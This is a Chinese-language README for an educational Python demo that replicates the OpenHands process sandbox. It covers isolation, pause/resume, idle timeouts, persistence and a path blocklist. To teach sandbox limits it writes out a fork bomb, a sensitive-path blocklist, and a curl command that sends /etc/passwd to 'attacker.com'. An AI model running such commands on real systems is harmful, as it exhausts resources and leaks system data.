# Demo —— ProcessSandbox 最小复刻

约 300 行 Python 复现 OpenHands sandbox 的核心模式：**抽象基类 + 后端实现 + 状态机 + per-task 隔离**。

## 为什么不用 Docker

OpenHands 真实代码有 3 个后端（Docker / Process / Remote）。Docker 对 demo 不友好（要装 docker-py、要运行 Docker daemon、要拉镜像）。本 demo 仿照 OpenHands 自己的 `ProcessSandboxService`——只用 subprocess + tempdir + psutil，任何 macOS / Linux 都能跑。

**诚实声明**：跟 OpenHands 一样，ProcessSandbox **不是真正的安全沙盒**，只是工作目录 silo。Agent 完全能 `cat /etc/passwd`。生产请用 Docker 后端。ANALYSIS.md 第 2.2 节有详细讨论。

## 跑法

```bash
cp ../.env.example .env  # 在 case 根目录, 填 API_KEY
pip install -r requirements.txt
python main.py            # 跑全部 4 个场景 (默认 process 后端)
python main.py --scenario 1   # 只跑某一个
python main.py --cleanup  # 清掉残留的 .sandboxes/
```

### 切换到 Docker 后端

```bash
python main.py --backend docker          # 4 个场景全部走 Docker 容器
python main.py --backend docker --scenario 2   # pause/resume 用容器 cgroup freezer
```

需要:
- `pip install 'docker>=6.0.0'` (已在 requirements.txt)
- 本机有 Docker daemon 在跑 (`docker ps` 能通)
- 用 colima / podman 的话: `export DOCKER_HOST=unix:///path/to/socket`

**关键观察**: 切换后端 `main.py` 跟 4 个 scenario 函数**没有一行改动**。这就是 SandboxService 抽象基类的价值 —— 业务代码只依赖契约，不依赖实现。

## 8 个场景

| # | 演示 | 后端要求 |
|---|------|---------|
| 1 | 并行隔离 + 鉴权 | 任一 |
| 2 | 状态机 + Pause/Resume | 任一 |
| 3 | LLM agent 跑在 sandbox 里 | 任一 |
| 4 | workspace 跨多轮持久 | 任一 |
| 5 | 资源限制（fork-bomb 被 pids_limit 拦） | **仅 Docker** |
| 6 | idle 超时自动 pause | 任一 |
| 7 | ProcessSandbox 路径黑名单（best-effort） | **仅 Process** |
| 8 | SQLite 持久化 + 跨进程恢复 | **仅 Process** |

### 场景 1 · 并行隔离
启动两个 sandbox A、B：
- A 创建 `a.txt`
- B 跑 `ls` —— 看不见 `a.txt`
- host 项目目录 —— 看不见 `a.txt`
- 用错的 session_api_key 访问 A —— 被拒

验证：**workspace 隔离 + 鉴权**。

### 场景 2 · 状态机 + Pause/Resume
心跳文件可视化进程是否运行：
- daemon 每秒写一次 `.heartbeat`
- pause → 心跳停（SIGSTOP）
- 在 PAUSED 状态 exec → 拒绝
- resume → 心跳继续走（SIGCONT）

验证：**状态机迁移 + 进程真冻结**。

### 场景 3 · LLM agent 跑在 sandbox 里
真调 LLM，让它写 fizzbuzz.py 并跑出来。全程通过 `bash` 工具，工具实现是 `sandbox.exec_in_sandbox`：
- 模型创建文件 → 在 sandbox workspace 里
- 模型运行脚本 → 在 sandbox workspace 里
- **host 项目目录前后对比 —— 一字不差**

验证：**LLM 不污染 host**。

### 场景 4 · workspace 跨多轮持久
- 第一轮写 state.txt
- 第二轮（独立 exec 调用，模拟下一条消息）能读出
- pause → resume 后还能读

验证：**per-conversation sandbox 不是 per-message**。

### 场景 5 · 资源限制（仅 Docker，对应 BENCHMARK upgrade #2）
- `mem_limit=512m / cpu_quota=0.5 core / pids_limit=64` 加在 `containers.run()`
- 在 sandbox 里跑经典 fork-bomb `:(){ :|:& };:`
- 容器收到 EAGAIN（fork 拒绝）→ host 仍存活 ✓

验证：**生产必加资源限制，OpenHands 默认没设的坑要自己补**。

### 场景 6 · idle-timeout 自动 pause（对应 BENCHMARK upgrade #5）
- 后台 sweeper 线程每 1 秒扫一次 `_iter_infos`
- last_activity 超过 5 秒未刷 → 自动 `pause_sandbox`
- 用户回来再 exec 时手动 resume 即可

验证：**长时间不用的 sandbox 不占 CPU**（pause 期 cgroup freezer 冻结）。

### 场景 7 · ProcessSandbox 路径黑名单（对应 BENCHMARK upgrade #6，best-effort）
- exec 前用正则扫命令字符串
- 命中 `/etc/ /usr/ /var/ /sys/ /proc/ /root/ ~/ $HOME ../` 任一即拒
- 同步把"这不是真 sandbox"刻在错误信息里

验证：**ProcessSandbox 本质不安全，只能 best-effort 兜底**（LLM 用 base64 / 变量替换能绕过）。

### 场景 8 · SQLite 持久化 + 跨进程恢复（对应 BENCHMARK upgrade #3）
- Step 1：本进程起 sandbox，写文件，*不 delete*
- Step 2：spawn 全新 python 子进程，传同样的 db_path
- 子进程从 SQLite reload，用 psutil 验证 pid 还活着，重新接管 daemon
- 子进程能 exec、pause、resume、delete 原 sandbox

验证：**OpenHands ProcessSandboxService 的"重启丢"缺陷可以这样补**。

## 文件分工

| 文件 | 对应 OpenHands 哪段 |
|------|--------------------|
| [sandbox.py](sandbox.py) | `openhands/app_server/sandbox/sandbox_service.py:29` + `process_sandbox_service.py:67` + `idle sweeper`（OpenHands 在 enterprise/）|
| [docker_sandbox.py](docker_sandbox.py) | `openhands/app_server/sandbox/docker_sandbox_service.py` |
| [persistence.py](persistence.py) | OpenHands 没等价物 (Process 后端已知缺陷) —— 这是 demo 的补丁 |
| [agent.py](agent.py) | Agent Server 那一层的简化版（合并到主进程） |
| [main.py](main.py) | 8 个端到端场景驱动 + `--backend` 切换 |

砍掉的部分（跟 sandbox 核心机制无关）：
- asyncio：用同步，看清流程
- HTTP 通信层：合并到本地 Python 调用
- Docker / Remote 后端：只保留 ProcessSandbox 演示抽象 + 一个实现
- 数据库持久化：内存字典，重启丢（同 OpenHands ProcessSandboxService）
- 资源限制：原版没设，demo 也没设

## 手玩

```bash
# 跑场景 1 后看磁盘上的 sandbox 目录
ls .sandboxes/
# 每个子目录是一个 sandbox 的隔离 workspace

# 看心跳 daemon 的日志
cat .sandboxes/<sandbox-id>/.sandbox-daemon.log

# 手工触发场景 2 的 daemon, 然后用 kill -STOP / kill -CONT 玩
ps aux | grep heartbeat
```

## 观察题目

跑完想想：
1. 如果你把 demo 的 `subprocess.run(["bash", "-c", command], cwd=workspace)` 改成 `subprocess.run(command, cwd=workspace, shell=True)`, 安全性会不会变? 为什么 OpenHands 选了 `["bash", "-c", ...]` 这种数组形式? (提示: shell injection)
2. 现在 session_api_key 用 `secrets.token_urlsafe(16)`. 如果改成 `random.randint(0, 1<<128)` 安全性怎么变? (提示: 伪随机 vs 密码学随机)
3. 场景 2 在 PAUSED 状态 exec 被拒了, 但如果 exec_in_sandbox **先**做鉴权 / 状态检查, **后**起子进程, 跟反过来比, 有什么差别? (提示: 状态-行为竞态)
4. 现在 demo 把所有 sandbox 信息存内存字典. 想让 `python main.py` 退出再起来时仍能查到 / 操作之前的 sandbox, 你要改哪几个地方? (提示: psutil.Process(pid) 可以从 pid 重建)
5. 如果 LLM 在 sandbox 里跑 `curl http://attacker.com -d "$(cat /etc/passwd)"`, demo 拦得住吗? (提示: 拦不住, 这就是为什么生产要 Docker + network policy)

带着问题去玩, 比读 README 收获大。
